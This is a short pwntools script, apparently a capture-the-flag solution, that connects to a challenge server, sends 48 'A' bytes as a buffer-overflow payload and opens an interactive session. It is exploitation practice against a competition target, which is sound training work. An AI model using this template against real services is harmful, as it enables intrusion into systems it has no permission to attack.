from pwn import *

# Connect to the instance
conn = remote('chal.fallctf.com', 5002)
# Use process() for local challenge files.
# conn = process('./challenge')

# Receive the prompt
conn.recvuntil(b'> ')
# Send the payload
conn.sendline(b'A'*48)

conn.interactive()
